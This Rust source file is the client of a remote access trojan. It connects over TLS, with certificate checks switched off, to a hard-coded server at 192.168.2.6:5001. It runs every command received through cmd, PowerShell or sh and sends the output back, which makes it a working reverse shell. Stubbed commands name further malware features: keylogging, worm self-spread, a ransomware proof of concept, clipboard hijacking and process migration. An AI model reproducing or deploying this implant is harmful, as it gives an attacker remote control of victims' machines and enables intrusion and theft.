use native_tls::TlsConnector;
use core::time;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::Path;
use std::process::Command;
use std::{thread, env};

fn current_dir() ->String{
    let cwd = env::current_dir().unwrap();
    let my_cwd = cwd.into_os_string().into_string().unwrap();
    return my_cwd;
}

fn mind_reader_sectioid( mindto_read:&str,Windows_shell: &str) -> Vec<u8>  {
    let output = if cfg!(target_os = "windows") {
        match Windows_shell {
            "cmd" => {
                Command::new(Windows_shell)
                .args(["/C ", mindto_read])
                .output()
                .expect("failed to execute process")
            },
            "powershell" => {
                Command::new("powershell")
                .args(["-c", mindto_read])
                .output()
                .expect("failed to execute process")
               
          },
          Windows_shell => {
                Command::new(Windows_shell)
                .args(["/C ", mindto_read])
                .output()
                .expect("failed to execute process")
                }

        };
        Command::new(Windows_shell)
                .args(["/C", mindto_read])
                .output()
                .expect("failed to execute process")
    } else {
        Command::new("sh")
                .arg("-c")
                .arg(mindto_read)
                .output()
                .expect("failed to execute process")
    };
    
    return output.stdout;
}


fn main() {
   // let connector = TlsConnector::new();
   let accept_invalid_certs = true;
    let tls_builder = native_tls::TlsConnector::builder()
    .danger_accept_invalid_certs(accept_invalid_certs)
    .build()
    .unwrap();
        //.build().expect("Failed to create TLS connector");
    let  stream = TcpStream::connect("192.168.2.6:5001").expect("Failed to connect to server");
    let mut tls = tls_builder.connect("192.168.2.6", stream).expect("Failed to create TLS stream");

    let mut muton = [0 as u8; 524288];
    let mut windows_shell="cmd";
    tls.write_all(current_dir().as_bytes());
    loop {
        tls.write_all(current_dir().as_bytes());
        tls.write_all(current_dir().as_bytes());
        //print on severside the working directory

        // read the command
        tls.read(&mut muton);
        //Converting Command ri a readable format
        let my_string = String::from_utf8_lossy(&muton);
        let mut splitted = my_string.split("\r");
        let raw_command=splitted.next().unwrap();

        println!("raw_command is {:?}",raw_command);
        

        // read_line leaves a trailing newline, which trim removes
        // this needs to be peekable so we can determine when we are on the last command
        let mut commands = raw_command.trim().split(" | ").peekable();

       
        while let Some(command) = commands.next() {
            // everything after the first whitespace character is interpreted as args to the command
            println!("{:?}",command);
            let mut parts = command.trim().split_whitespace();
            if command.is_empty() {
                tls.write_all(b"Empty data");
            }else {
                
            let command = parts.next().unwrap();
            let args = parts;

            match command {
                "cd" => {
                    // default to '/' as new directory if one was not provided
                    let new_dir = args.peekable().peek().map_or("/", |x| *x);
                    let root = Path::new(new_dir);
                    if let Err(e) = env::set_current_dir(&root) {
                        eprintln!("{}", e);
                    }

                   
                }
                //https://docs.rs/powershell_script/latest/powershell_script/
                "powershell" => {
                    windows_shell="powershell"; 
                    tls.write_all(b"Sleep Finished"); },
                "cmd" => {windows_shell="cmd";  tls.write_all(b"Sleep Finished");},
                "ClippyON" => return,
                "ClippyOFF" => return,
                "CreapyON" => return,
                "CreapyOFF" => return,
                "Make_Self" => return,
                "KeySnipON" => return,
                "KeySnipOFF" => return,
                "WormSelf" => return,
                "RansomOnPOC" => return,
                "Migrate" => return,
                "EnableDebugPrivileges"=> {},
                "sleep15s" => {
                    let ten_millis = time::Duration::from_millis(15000);
                    thread::sleep(ten_millis);
                    tls.write_all(b"Sleep Finished");
                },
                command => {
                let Output= mind_reader_sectioid(command,windows_shell);
                let c: &[u8] =&Output;
                tls.write_all(c);

                }
            }
            }
            
            
        }
          
        

    

    }


}